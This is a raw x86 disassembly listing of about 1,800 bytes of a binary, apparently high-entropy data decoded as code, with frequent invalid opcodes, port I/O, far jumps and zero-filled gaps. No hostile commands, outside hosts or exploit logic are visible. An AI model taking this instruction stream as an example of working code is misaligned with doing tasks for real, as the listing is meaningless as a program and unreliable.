  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	(bad)  [eax+0x675d6d74]
  427767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427768:	add    DWORD PTR [eax],eax
  42776a:	add    BYTE PTR [ecx],al
  42776c:	add    BYTE PTR [eax],al
  42776e:	icebp  
  42776f:	nop
  427770:	call   0xa314:0xe1b09ec7
  427777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427778:	xor    BYTE PTR [edx+eax*8+0x59],ah
  42777c:	push   cs
  42777d:	add    esi,DWORD PTR fs:[ecx-0x28599996]
  427784:	xor    eax,0x5c45b365
  427789:	or     bh,BYTE PTR ds:0x9e8874e
  42778f:	not    DWORD PTR [esi]
  427791:	adc    al,0x2f
  427793:	add    ah,bh
  427795:	jb     0x4277f6
  427797:	or     BYTE PTR [ebp+0x1e3c7f8f],bh
  42779d:	stc    
  42779e:	rcl    edi,0xfb
  4277a1:	push   ds
  4277a2:	outs   dx,DWORD PTR ds:[esi]
  4277a3:	test   al,0xf9
  4277a5:	into   
  4277a6:	sbb    eax,0xe186036c
  4277ab:	loope  0x42777f
  4277ad:	push   edx
  4277ae:	arpl   WORD PTR [eax],di
  4277b0:	test   al,0x40
  4277b2:	add    ecx,DWORD PTR cs:[ebx+0x6d]
  4277b6:	xchg   esi,eax
  4277b7:	mov    ebx,0xfa72ddfb
  4277bc:	arpl   cx,si
  4277be:	push   esi
  4277bf:	or     eax,0xa05a5c90
  4277c4:	into   
  4277c5:	nop
  4277c6:	push   0x20
  4277c8:	iret   
  4277c9:	xchg   edi,eax
  4277ca:	xchg   ebx,eax
  4277cb:	fld    TBYTE PTR [esi+edx*4]
  4277ce:	fs and al,0x67
  4277d1:	imul   ebx,DWORD PTR [edx+edi*8],0xe980b4d3
  4277d8:	cdq    
  4277d9:	scas   al,BYTE PTR es:[edi]
  4277da:	ret    
  4277db:	and    al,0xf4
  4277dd:	rcl    edi,cl
  4277df:	push   0x1f
  4277e1:	add    eax,0x9b82262
  4277e6:	das    
  4277e7:	jmp    0x4277bc
  4277e9:	cmc    
  4277ea:	adc    DWORD PTR [edi],0xae45f104
  4277f0:	add    BYTE PTR [esi],al
  4277f2:	loope  0x42786d
  4277f4:	xchg   ebx,eax
  4277f5:	or     DWORD PTR ds:0x47761b79,edi
  4277fb:	mov    eax,ds:0x1d9681a9
  427800:	dec    esp
  427801:	out    dx,eax
  427802:	xor    eax,0x538a5d81
  427807:	pushf  
  427808:	push   edx
  427809:	xchg   ecx,eax
  42780a:	pop    ds
  42780b:	outs   dx,BYTE PTR ds:[esi]
  42780c:	hlt    
  42780d:	shr    BYTE PTR [eax],1
  42780f:	fisttp WORD PTR [edi-0x79]
  427812:	cwde   
  427813:	(bad)  
  427814:	sbb    al,0x1
  427816:	call   FWORD PTR [edx]
  427818:	ret    0xa0d9
  42781b:	popf   
  42781c:	xchg   BYTE PTR [edi+ebx*8],al
  42781f:	sti    
  427820:	push   ss
  427821:	mov    edi,0xf884a0f9
  427826:	cld    
  427827:	mov    eax,ds:0xdf7cc302
  42782c:	pusha  
  42782d:	shl    ah,cl
  42782f:	cmp    ebx,0x55465703
  427835:	mov    dl,0x66
  427837:	addr16 mov ecx,0x547a84e
  42783d:	(bad)  
  42783e:	loop   0x4277e3
  427840:	adc    ecx,edi
  427842:	jmp    0xb825bf55
  427847:	mov    eax,ds:0x9b65bef1
  42784c:	add    ah,bh
  42784e:	or     dh,BYTE PTR [edx]
  427850:	in     eax,0xd9
  427852:	and    DWORD PTR [ebx+0x4ceb6813],edx
  427858:	cmp    BYTE PTR [ecx],ah
  42785a:	push   0xf814076d
  42785f:	inc    edx
  427860:	or     al,BYTE PTR ds:0x2bca96ef
  427866:	and    DWORD PTR [ebx-0xab22f9f],edi
  42786c:	sub    BYTE PTR [eax+0x0],bl
	...
  4278d3:	add    BYTE PTR [eax],al
  4278d5:	add    BYTE PTR [edx],bl
  4278d7:	mov    cl,BYTE PTR [ebx]
  4278d9:	inc    ebp
  4278da:	fwait
  4278db:	lds    ebx,FWORD PTR [esi-0x21]
  4278de:	jo     0x427945
  4278e0:	fldl2e 
  4278e2:	xor    eax,0x67c8a360
  4278e7:	test   al,0x1
  4278e9:	add    BYTE PTR [eax],al
  4278eb:	add    DWORD PTR [eax],eax
  4278ed:	add    BYTE PTR [edx+0x56],bh
  4278f0:	leave  
  4278f1:	nop
  4278f2:	mov    eax,0xddc5b599
  4278f7:	repz fsubr QWORD PTR [eax+0x60b880be]
  4278fe:	xchg   DWORD PTR [esp+esi*2+0x4e774588],esi
  427905:	dec    edi
  427906:	inc    esp
  427907:	inc    ebx
  427908:	jecxz  0x427977
  42790a:	mov    dh,0x79
  42790c:	sbb    eax,0x64c4aaac
  427911:	in     al,dx
  427912:	cmp    bh,dh
  427914:	mov    dl,0x8f
  427916:	outs   dx,DWORD PTR ds:[esi]
  427917:	stos   DWORD PTR es:[edi],eax
  427918:	pop    ss
  427919:	inc    ecx
  42791a:	cld    
  42791b:	add    esi,DWORD PTR [edi]
  42791d:	clc    
  42791e:	ins    BYTE PTR es:[edi],dx
  42791f:	(bad)  
  427920:	push   eax
  427921:	mov    ah,0xff
  427923:	loopne 0x427953
  427925:	pop    edx
  427926:	iret   
  427927:	out    dx,eax
  427928:	dec    ecx
  427929:	das    
  42792a:	in     eax,dx
  42792b:	and    DWORD PTR [eax+0x67026b5d],eax
  427931:	es jmp 0x42799a
  427934:	ss jae 0x427985
  427937:	ins    BYTE PTR es:[edi],dx
  427938:	xchg   edx,eax
  427939:	js     0x427954
  42793b:	adc    esi,DWORD PTR [ebx-0x25]
  42793e:	idiv   DWORD PTR ds:0xf5eedc41
  427944:	test   ebx,0x6f8b82d5
  42794a:	pop    edx
  42794b:	dec    ebx
  42794c:	xchg   ebp,eax
  42794d:	add    DWORD PTR [edx+eiz*2-0x49],ecx
  427951:	leave  
  427952:	dec    ebx
  427953:	leave  
  427954:	mov    ds,WORD PTR [esi+0x71]
  427957:	jno    0x42791f
  427959:	nop
  42795a:	popf   
  42795b:	adc    BYTE PTR [ebp+ebx*8-0x6d],dl
  42795f:	push   0x6c88a549
  427964:	sub    al,0x99
  427966:	inc    edx
  427967:	jae    0x42799a
  427969:	pushf  
  42796a:	mov    edi,0xf02864be
  42796f:	mov    bl,0x52
  427971:	pop    edx
  427972:	iret   
  427973:	rcr    eax,0xb
  427976:	jl     0x42797e
  427978:	adc    al,BYTE PTR [ebx+0x1c5954ed]
  42797e:	(bad)  
  427980:	mov    ebx,0x2d07aaf5
  427985:	ins    DWORD PTR es:[edi],dx
  427986:	mov    ds:0x95f2d5b6,al
  42798b:	popf   
  42798c:	fisubr DWORD PTR [esi+edx*1]
  42798f:	loope  0x427a01
  427991:	mov    al,ds:0xfadec613
  427996:	gs es pop esp
  427999:	inc    edx
  42799a:	lods   eax,DWORD PTR ds:[esi]
  42799b:	scas   eax,DWORD PTR es:[edi]
  42799c:	inc    esp
  42799d:	lahf   
  42799e:	jnp    0x4279b1
  4279a0:	les    ebx,FWORD PTR [eax+0x2c]
  4279a3:	sub    al,0x61
  4279a5:	aad    0x99
  4279a7:	sti    
  4279a8:	dec    edx
  4279a9:	call   0x5764:0x77d47128
  4279b0:	sbb    ecx,DWORD PTR [edx-0x42]
  4279b3:	int3   
  4279b4:	xor    BYTE PTR [ecx-0x3a],cl
  4279b7:	aaa    
  4279b8:	clc    
  4279b9:	ins    BYTE PTR es:[edi],dx
  4279ba:	push   esi
  4279bb:	mov    dh,0x5a
  4279bd:	jmp    0x149:0xe318fdff
  4279c4:	mov    dl,0x83
  4279c6:	pop    ds
  4279c7:	ja     0x427955
  4279c9:	ds call 0xff8b:0xb0aa36f8
  4279d1:	aam    0x44
  4279d3:	inc    eax
  4279d4:	jg     0x4279ad
  4279d6:	cdq    
  4279d7:	pop    esi
  4279d8:	addr16 es into 
  4279db:	sahf   
  4279dc:	adc    esi,DWORD PTR [ebx]
  4279de:	cmp    ebx,DWORD PTR [esi+0x2d]
  4279e1:	sbb    eax,0xb3243c57
  4279e6:	mov    ds:0x94a51ece,eax
  4279eb:	add    al,0x67
  4279ed:	cmp    BYTE PTR [eax],al
	...
  427a53:	add    BYTE PTR [eax],al
  427a55:	add    BYTE PTR [edx-0x5c0023],bl
  427a5b:	mov    ds:0x7542fdde,eax
  427a60:	fadd   DWORD PTR [ebx+0x15a8dd74]
  427a66:	addr16 test eax,0x1000001
  427a6c:	add    BYTE PTR [eax],al
  427a6e:	and    al,0x76
  427a70:	pop    ds
  427a71:	loope  0x427a67
  427a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a74:	mov    BYTE PTR [ecx+ebp*1-0x7f],al
  427a78:	(bad)  
  427a79:	mov    ebp,0x97510ca5
  427a7e:	mov    ds:0x187f0e52,eax
  427a83:	gs clc 
  427a85:	pop    ecx
  427a86:	mov    ecx,DWORD PTR [edx+0x67de8d3e]
  427a8c:	(bad)  
  427a8d:	in     eax,dx
  427a8e:	inc    edi
  427a8f:	aam    0xaa
  427a91:	daa    
  427a92:	cli    
  427a93:	xchg   ebx,eax
  427a94:	dec    esi
  427a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a96:	(bad)  
  427a97:	xor    BYTE PTR [esi],dh
  427a99:	in     al,dx
  427a9a:	pop    esi
  427a9b:	inc    esi
  427a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a9d:	test   eax,0xebfc4728
  427aa2:	ret    
  427aa3:	dec    ebp
  427aa4:	dec    eax
  427aa5:	int    0xd6
  427aa7:	scas   eax,DWORD PTR es:[edi]
  427aa8:	mov    dh,0x2e
  427aaa:	cmp    edi,esp
  427aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427aad:	test   eax,0x22373697
  427ab2:	sbb    BYTE PTR [eax+0x41b6289c],dl
  427ab8:	sub    ecx,DWORD PTR [esp+edi*8-0x11]
  427abc:	pop    esi
  427abd:	mov    ds:0xa1eb390,eax
  427ac2:	add    BYTE PTR ds:0x624f3567,cl
  427ac8:	xchg   esi,eax
  427ac9:	dec    esp
  427aca:	lds    edx,FWORD PTR [edx-0x45]
  427acd:	sub    edi,DWORD PTR [eax-0x23465f86]
  427ad3:	sbb    dh,BYTE PTR [esi+0x9fc6343]
  427ad9:	es es jg 0x427b06
  427add:	cmp    DWORD PTR [eax-0x42],esp
  427ae0:	fwait
  427ae1:	jne    0x427b15
  427ae3:	je     0x427b16
  427ae5:	push   edx
  427ae6:	xor    eax,0x1d2cc1bf
  427aeb:	jo     0x427b3d
  427aed:	or     bl,bh
  427aef:	test   DWORD PTR [eax+ebx*4],0xd8b2302
  427af6:	aaa    
  427af7:	inc    eax
  427af8:	xlat   BYTE PTR ds:[ebx]
  427af9:	mov    gs,WORD PTR [edi]
  427afb:	dec    ebp
  427afc:	push   esi
  427afd:	inc    edx
  427afe:	stos   BYTE PTR es:[edi],al
  427aff:	mov    dh,0x54
  427b01:	retf   
  427b02:	daa    
  427b03:	iret   
  427b04:	test   al,0x13
  427b06:	and    eax,0xb3852cbe
  427b0b:	sbb    eax,0xe986e7c3
  427b10:	popa   
  427b11:	add    ch,dh
  427b13:	mov    esp,0xec27c94d
  427b18:	cmp    al,0x65
  427b1a:	mov    ebx,0xc9a358eb
  427b1f:	stos   DWORD PTR es:[edi],eax
  427b20:	add    eax,0x47b76351
  427b25:	jecxz  0x427b34
  427b27:	xor    dl,bh
  427b29:	xcrypt-cfb (bad)
  427b2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b2c:	pusha  
  427b2d:	jno    0x427af3
  427b2f:	push   0x2bd3f393
  427b34:	test   DWORD PTR [edx],edi
  427b36:	adc    DWORD PTR [eax],ebp
  427b38:	dec    ecx
  427b39:	mov    ?,WORD PTR [ecx-0x5bd83459]
  427b3f:	inc    esp
  427b40:	jns    0x427b30
  427b42:	cmp    ch,dl
  427b44:	pushf  
  427b45:	xchg   ecx,eax
  427b46:	in     al,dx
  427b47:	jle    0x427bb8
  427b49:	push   0x8a79f191
  427b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b4f:	dec    esi
  427b50:	stos   BYTE PTR es:[edi],al
  427b51:	xchg   ecx,eax
  427b52:	pusha  
  427b53:	mov    al,ds:0xd4b81f9c
  427b58:	shl    DWORD PTR [eax+edi*1+0x25602c38],0xbd
  427b60:	stos   BYTE PTR es:[edi],al
  427b61:	cmp    al,0xe9
  427b63:	leave  
  427b64:	ffreep st(6)
  427b66:	sub    BYTE PTR [ecx+0x26],bh
  427b69:	std    
  427b6a:	jmp    0x0:0xcefb9f
	...
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	idiv   bh
  427be3:	xor    ah,dh
  427be5:	or     esp,DWORD PTR [edi-0x56]
  427be8:	add    DWORD PTR [eax],eax
  427bea:	add    BYTE PTR [ecx],al
  427bec:	add    BYTE PTR [eax],al
  427bee:	fcmove st,st(6)
  427bf0:	and    eax,0xa53452aa
  427bf5:	les    edi,FWORD PTR [edi-0x53]
  427bf8:	adc    BYTE PTR [esi+ecx*8+0xc],bh
  427bfc:	mov    WORD PTR [esi-0x5b],es
  427bff:	adc    al,0xa9
  427c01:	dec    ebp
  427c02:	scas   eax,DWORD PTR es:[edi]
  427c03:	data16 stos BYTE PTR es:[edi],al
  427c05:	loope  0x427c0c
  427c07:	lock jecxz 0x427c10
  427c0a:	loop   0x427c81
  427c0c:	loope  0x427bdd
  427c0e:	test   BYTE PTR [edx+0x6dbe7f86],0xd
  427c15:	loop   0x427bb5
  427c17:	fld    QWORD PTR [ebx-0x2c]
  427c1a:	sub    al,0x46
  427c1c:	xor    dl,BYTE PTR fs:[edx-0x6e]
  427c20:	jecxz  0x427c4b
  427c22:	daa    
  427c23:	jns    0x427bfa
  427c25:	pop    edx
  427c26:	adc    al,0xe6
  427c28:	mov    al,BYTE PTR [ecx]
  427c2a:	dec    esp
  427c2b:	push   es
  427c2c:	push   0xffffffc9
  427c2e:	and    edi,DWORD PTR [edx+edx*4-0x4e]
  427c32:	leave  
  427c33:	sti    
  427c34:	pop    edx
  427c35:	ins    DWORD PTR es:[edi],dx
  427c36:	sub    BYTE PTR [esi],al
  427c38:	mov    edx,0xe9754ef1
  427c3d:	scas   eax,DWORD PTR es:[edi]
  427c3e:	lods   eax,DWORD PTR ds:[esi]
  427c3f:	mov    cs,bx
  427c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c43:	or     eax,DWORD PTR [edi-0x49]
  427c46:	add    dl,BYTE PTR [ebp-0x57b43ee]
  427c4c:	fdiv   DWORD PTR [edx+0xf594c75]
  427c52:	int    0x27
  427c54:	in     eax,0xb3
  427c56:	(bad)  [edi+0xd5d182a]
  427c5c:	add    al,0x88
  427c5e:	mov    ah,0xb1
  427c60:	dec    eax
  427c61:	iret   
  427c62:	pop    edx
  427c63:	(bad)  
  427c64:	shr    BYTE PTR [ecx],0x45
  427c67:	ds retf 0x8bde
  427c6b:	mov    eax,0xef4b5618
  427c70:	push   esi
  427c71:	rol    BYTE PTR [ebx],0x75
  427c74:	mov    al,ds:0x29c7a469
  427c79:	xchg   ebp,eax
  427c7a:	sbb    cl,BYTE PTR [ebp-0x2d515521]
  427c80:	aam    0x7f
  427c82:	push   ecx
  427c83:	mov    ds:0xc8e83c10,eax
  427c88:	jbe    0x427cff
  427c8a:	xchg   BYTE PTR [edx],cl
  427c8c:	pushf  
  427c8d:	(bad)  
  427c8e:	hlt    
  427c8f:	pusha  
  427c90:	sbb    ebp,edx
  427c92:	and    ecx,DWORD PTR [esi]
  427c94:	in     al,0xb5
  427c96:	and    edx,DWORD PTR [ebx+0x74f08c70]
  427c9c:	data16 (bad) 
  427c9e:	or     eax,0xf4aa4e59
  427ca3:	sar    BYTE PTR [eax+ecx*1-0x358ded90],cl
  427caa:	mov    cl,0xaa
  427cac:	sub    BYTE PTR [edi+0x71e44d89],0xd5
  427cb3:	outs   dx,BYTE PTR ds:[esi]
  427cb4:	leave  
  427cb5:	addps  xmm5,xmm7
  427cb8:	jp     0x427d0a
  427cba:	jge    0x427cf1
  427cbc:	cdq    
  427cbd:	cld    
  427cbe:	out    0x39,al
  427cc0:	retf   
  427cc1:	dec    edx
  427cc2:	jo     0x427c6c
  427cc4:	or     dh,cl
  427cc6:	sub    DWORD PTR [esi+0x9],0xffffff97
  427cca:	add    BYTE PTR [edi-0x3f],ah
  427ccd:	(bad)
  427cd0:	test   ebp,edx
  427cd2:	(bad)  
  427cd3:	pop    ecx
  427cd4:	sub    BYTE PTR [ebx],al
  427cd6:	loop   0x427d4d
  427cd8:	jmp    0x427cfd
  427cda:	inc    ecx
  427cdb:	imul   ebx,DWORD PTR [eax],0x55d37d37
  427ce1:	push   ds
  427ce2:	fld    DWORD PTR [ebp-0x52]
  427ce5:	leave  
  427ce6:	inc    edx
  427ce7:	call   0xf24ccf90
  427cec:	dec    eax
  427ced:	adc    eax,DWORD PTR [eax]
	...
  427d53:	add    BYTE PTR [eax],al
  427d55:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0x76555d44,ebx
  427d64:	mov    eax,0x1ab6714
  427d69:	add    BYTE PTR [eax],al
  427d6b:	add    DWORD PTR [eax],eax
  427d6d:	add    dl,ah
  427d6f:	xor    bl,ch
  427d71:	sub    al,0x7a
  427d73:	mov    ds:0xa18d6bc3,eax
  427d78:	cmp    ebx,esi
  427d7a:	cmp    al,0xe9
  427d7c:	mov    eax,0x98e6715c
  427d81:	jne    0x427d6e
  427d83:	js     0x427e01
  427d85:	psrld  mm6,QWORD PTR [ecx-0x11]
  427d89:	dec    edx
  427d8a:	push   cs
  427d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d8c:	scas   al,BYTE PTR es:[edi]
  427d8d:	cmp    eax,0x515a8c18
  427d92:	sub    dh,al
  427d94:	push   ebp
  427d95:	or     eax,0x17210dad
  427d9a:	push   ds
  427d9b:	xchg   edx,eax
  427d9c:	adc    al,0x84
  427d9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d9f:	daa    
  427da0:	(bad)  
  427da1:	and    eax,DWORD PTR [ebp-0x5c]
  427da4:	dec    esi
  427da5:	mov    ebp,0xc64eeda3
  427daa:	js     0x427da7
  427dac:	sbb    ecx,0x4e
  427daf:	cld    
  427db0:	push   ebx
  427db1:	and    DWORD PTR [ebp-0x6142dba0],ebp
  427db7:	cmpps  xmm7,XMMWORD PTR [ebx-0x644961a0],0xcf
  427dbf:	fmul   QWORD PTR [ebx-0x36]
  427dc2:	lods   eax,DWORD PTR ds:[esi]
  427dc3:	and    eax,DWORD PTR [ebx-0x6f]
  427dc6:	jmp    0x427d5f
  427dc8:	dec    ecx
  427dc9:	dec    ebp
  427dca:	aaa    
  427dcb:	jae    0x427e39
  427dcd:	mov    DWORD PTR [edi],ebp
  427dcf:	add    ah,bl
  427dd1:	neg    bh
  427dd3:	and    DWORD PTR [ecx-0x171a9517],eax
  427dd9:	dec    eax
  427dda:	out    dx,al
  427ddb:	pop    es
  427ddc:	sub    DWORD PTR [esi-0x26],ebp
  427ddf:	int    0x18
  427de1:	mov    eax,0x3e5b1570
  427de6:	xchg   DWORD PTR [ecx-0x4b6df891],edx
  427dec:	mov    esp,0xbf8e440c
  427df1:	dec    esp
  427df2:	(bad)  
  427df3:	mov    eax,ds:0xc309d9c4
  427df8:	call   0xa0cf:0x7c5139b7
  427dff:	stos   DWORD PTR es:[edi],eax
  427e00:	mov    al,ds:0x69e73a7
  427e05:	jae    0x427e63
  427e07:	jle    0x427dac
  427e09:	push   ebp
  427e0a:	imul   ecx,DWORD PTR [eax-0x32],0x1
  427e0e:	sub    DWORD PTR [ecx],0x535794bd
  427e14:	stos   BYTE PTR es:[edi],al
  427e15:	dec    ebp
  427e16:	das    
  427e17:	jp     0x427e48
  427e19:	lds    esp,FWORD PTR [eax]
  427e1b:	aaa    
  427e1c:	fcmovb st,st(0)
  427e1e:	gs hlt 
  427e20:	and    BYTE PTR [ecx-0xc1eec42],0x35
  427e27:	push   cs
  427e28:	mov    dh,BYTE PTR [edx+0x1a]
  427e2b:	cmc    
  427e2c:	call   0xe5ad:0xb8a74d2
  427e33:	or     BYTE PTR [ebx+0x1c53baf0],0x70
  427e3a:	mul    ah
  427e3c:	outs   dx,BYTE PTR ds:[esi]
  427e3d:	repz js 0x427e2a
  427e40:	daa    
  427e41:	pop    ecx
  427e42:	mov    DWORD PTR [edx],0x98fd1f17
  427e48:	pushf  
  427e49:	push   es
  427e4a:	mov    ds:0x592a6789,eax
  427e4f:	sti    
  427e50:	mov    esi,0x3ae78f94
  427e55:	mov    dl,0x53
  427e57:	adc    BYTE PTR ds:0xce63a346,bl
  427e5d:	icebp  
  427e5e:	xor    bl,cl
  427e60:	xlat   BYTE PTR ds:[ebx]
  427e61:	jl     0x427e63
  427e63:	adc    bh,BYTE PTR [ebx+0x2c78998e]
  427e69:	lahf   
  427e6a:	sbb    al,0xac
  427e6c:	popf   
  427e6d:	xchg   edx,eax
	...
  427ed6:	mov    eax,0x6d3c25f1
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	cmp    al,0xdd
  427ee4:	or     DWORD PTR [edi+eiz*2],0x1ac
  427eeb:	add    DWORD PTR [eax],eax
  427eed:	add    BYTE PTR [edx-0x27],al
  427ef0:	into   
  427ef1:	repz sbb edi,ecx
  427ef4:	push   cs
  427ef5:	fiadd  DWORD PTR [edx-0x65]
  427ef8:	bound  edi,QWORD PTR [eax]
  427efa:	iret   
  427efb:	pop    edx
  427efc:	add    al,0xf
  427efe:	shr    DWORD PTR [ecx],0xee
  427f01:	inc    eax
  427f02:	cmp    bh,BYTE PTR cs:[ebx]
  427f05:	popf   
  427f06:	stos   BYTE PTR es:[edi],al
  427f07:	(bad)  
  427f09:	jne    0x427ec1
  427f0b:	xor    DWORD PTR [edx-0x23a8f869],edx
  427f11:	pop    edi
  427f12:	shr    eax,1
  427f14:	fsub   st(7),st
  427f16:	idiv   bl
  427f18:	sub    BYTE PTR [edx+0x2b36acf9],bh
  427f1e:	push   0xfffffffb
  427f20:	outs   dx,BYTE PTR ds:[esi]
  427f21:	shl    BYTE PTR [ebx-0x76ba38e1],1
  427f27:	out    dx,eax
  427f28:	jmp    0xc9010e25
  427f2d:	xchg   esi,eax
  427f2e:	arpl   WORD PTR [ecx+0x7d1b2811],si
  427f34:	xor    edi,esp
  427f36:	test   DWORD PTR [edx+0x3e8ee63d],ebx
  427f3c:	retf   0xcd96
  427f3f:	out    dx,eax
  427f40:	add    dl,BYTE PTR ds:[edi-0x214870b1]
  427f47:	jo     0x427f91
  427f49:	(bad)  
  427f4a:	pop    edi
  427f4b:	sbb    BYTE PTR [esi+0x17],dl
  427f4e:	loop   0x427f60
  427f50:	imul   ebp,DWORD PTR [edi+0x17],0xffffffd4
  427f54:	lea    ecx,[ecx]
  427f56:	das    
  427f57:	mov    edi,0xdf708881
  427f5c:	mov    DWORD PTR [ebx+0x2c4ffb67],ebx
  427f62:	(bad)  
  427f63:	pop    eax
  427f64:	lfs    eax,FWORD PTR [ebx-0x8]
  427f68:	jae    0x427fa6
  427f6a:	or     eax,0x7917c962
  427f6f:	rcl    DWORD PTR [edi-0x5b],0x6f
  427f73:	mov    WORD PTR [esi-0x6],ds
  427f76:	jg     0x427fc2
  427f78:	and    dh,BYTE PTR [edx+0x77b29626]
  427f7e:	sub    al,0x5a
  427f80:	sbb    dh,BYTE PTR [edi-0x25]
  427f83:	sar    BYTE PTR [ecx-0x2c],1
  427f86:	xchg   ebx,eax
  427f87:	or     BYTE PTR [edi],cl
  427f89:	jp     0x427f2f
  427f8b:	test   esi,ecx
  427f8d:	lods   eax,DWORD PTR ds:[esi]
  427f8e:	(bad)  
  427f8f:	push   eax
  427f90:	mov    al,ds:0x8636f86e
  427f95:	xchg   edi,eax
  427f96:	mov    ecx,0xfd3534de
  427f9b:	cmp    DWORD PTR [edx+0x3eaf81e1],edi
  427fa1:	nop
  427fa2:	mov    esp,0xd9890842
  427fa7:	cwde   
  427fa8:	inc    ax
  427faa:	ja     0x427f4b
  427fac:	mov    ebp,0xc6d29329
  427fb1:	xor    BYTE PTR [eax+esi*8],ah
  427fb4:	xor    al,bl
  427fb6:	xchg   edi,eax
  427fb7:	stos   DWORD PTR es:[edi],eax
  427fb8:	sub    BYTE PTR [ebp+0x3931d64a],ah
  427fbe:	lds    esp,FWORD PTR [edx-0x1a8a78a2]
  427fc4:	pop    ebp
  427fc5:	add    dh,BYTE PTR [esi+0x542dd1cc]
  427fcb:	fcomip st,st(3)
  427fcd:	jmp    0x21cd:0xc8f6a4ac
  427fd4:	retf   
  427fd5:	mov    esp,0x7dc688c8
  427fda:	in     eax,0xe0
  427fdc:	push   ecx
  427fdd:	sub    BYTE PTR [edx+0x67d0b89b],bh
  427fe3:	(bad)  
  427fe4:	call   0xae0dacfd
  427fe9:	jne    0x427fde
  427feb:	ss loopne 0x427fee
	...
  428056:	mov    cl,0xa7
  428058:	dec    ebx
  428059:	das    
  42805a:	pop    edi
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	sbb    al,0x8c
  428064:	bound  ecx,QWORD PTR [eax]
  428066:	lods   eax,DWORD PTR ds:[si]
  428068:	add    DWORD PTR [eax],eax
  42806a:	add    BYTE PTR [ecx],al
  42806c:	add    BYTE PTR [eax],al
  42806e:	pop    ebp
  42806f:	jns    0x4280da
  428071:	push   esi
  428072:	push   eax
  428073:	mov    BYTE PTR [ebp+0x28d5663d],0x25
  42807a:	cs aas 
  42807c:	cmp    ebx,DWORD PTR [ebx+esi*1-0x4be15b6c]
  428083:	out    dx,al
  428084:	enter  0x8855,0x40
  428088:	(bad)  
  428089:	push   es
  42808a:	or     eax,0xbf86a98b
  42808f:	scas   eax,DWORD PTR es:[edi]
  428090:	not    ecx
  428092:	push   edx
  428093:	inc    edx
  428094:	mov    ebp,0x13559f77
  428099:	out    dx,eax
  42809a:	or     ch,BYTE PTR [esp+ebp*2]
  42809d:	ret    0x36d7
  4280a0:	or     ch,0x63
  4280a3:	inc    edi
  4280a4:	inc    BYTE PTR [edi+0x5a1672fc]
  4280aa:	loop   0x4280cc
  4280ac:	iret   
  4280ad:	adc    eax,0xb02ad1ed
  4280b2:	sbb    DWORD PTR [esp+eax*8+0x24],ebp
  4280b6:	imul   eax,DWORD PTR [ebx+0x1c],0xffffffeb
  4280ba:	cmp    DWORD PTR [ebx+ebp*1],edi
  4280bd:	es mov ch,0x55
  4280c0:	in     eax,dx
  4280c1:	jbe    0x4280bb
  4280c3:	adc    al,0xda
  4280c5:	aaa    
  4280c6:	add    al,0x7a
  4280c8:	sub    esi,DWORD PTR [eax+0x45]
  4280cb:	mov    esi,0x6efbcd6e
  4280d0:	sub    DWORD PTR [ecx-0x70],ecx
  4280d3:	icebp  
  4280d4:	call   0xead0ac2
  4280d9:	addr16 call 0x2ba2b982
  4280df:	push   ecx
  4280e0:	adc    ch,cl
  4280e2:	mov    al,ds:0xd36a00bd
  4280e7:	fadd   QWORD PTR [eax+0x53490b58]
  4280ed:	push   edi
  4280ee:	sub    esi,DWORD PTR [ebx+esi*4+0x43a8952d]
  4280f5:	outs   dx,BYTE PTR ds:[esi]
  4280f6:	ins    BYTE PTR es:[edi],dx
  4280f7:	cli    
  4280f8:	daa    
  4280f9:	push   ss
  4280fa:	push   ecx
  4280fb:	cmp    ch,bl
  4280fd:	stc    
  4280fe:	scas   al,BYTE PTR es:[edi]
  4280ff:	stc    
  428100:	xchg   BYTE PTR [ebx],al
  428102:	ret    
  428103:	mov    WORD PTR [eax],?
  428105:	jmp    0x428093
  428107:	and    DWORD PTR [edi+0x1efcb765],esp
  42810d:	js     0x4280b6
  42810f:	and    ch,BYTE PTR [eax+0x56b64c92]
  428115:	scas   eax,DWORD PTR es:[edi]
  428116:	dec    edx
  428117:	mov    eax,ds:0xc845a401
  42811c:	gs inc ebp
  42811e:	mov    bl,0x9
  428120:	je     0x4280f1
  428122:	mov    cl,0xf4
  428124:	fadd   DWORD PTR [esp+edx*8]
  428127:	cwde   
  428128:	leave  
  428129:	adc    dl,ah
  42812b:	lods   eax,DWORD PTR ds:[esi]
  42812c:	push   eax
  42812d:	iret   
  42812e:	jg     0x4280f9
  428130:	jo     0x42813a
  428132:	sbb    al,0x5a
  428134:	jno    0x4280dd
  428136:	fwait
  428137:	ret    
  428138:	pushf  
  428139:	jg     0x4280e8
  42813b:	lods   eax,DWORD PTR ds:[esi]
  42813c:	fidiv  DWORD PTR [ebx+eiz*8+0x5ee44f36]
  428143:	pop    ecx
  428144:	loope  0x428150
  428146:	in     eax,dx
  428147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428148:	jnp    0x4281ad
  42814a:	xor    eax,0x3685d150
  42814f:	xchg   esp,eax
  428150:	mov    bh,0xda
  428152:	clc    
  428153:	adc    BYTE PTR [edi+0x38],ch
  428156:	cli    
  428157:	dec    edx
  428158:	out    dx,eax
  428159:	sub    DWORD PTR [ecx+0x15],ecx
  42815c:	out    dx,eax
  42815d:	or     bh,bl
  42815f:	cmp    DWORD PTR [esp+ebp*4],edi
  428162:	inc    esp
  428163:	push   ss
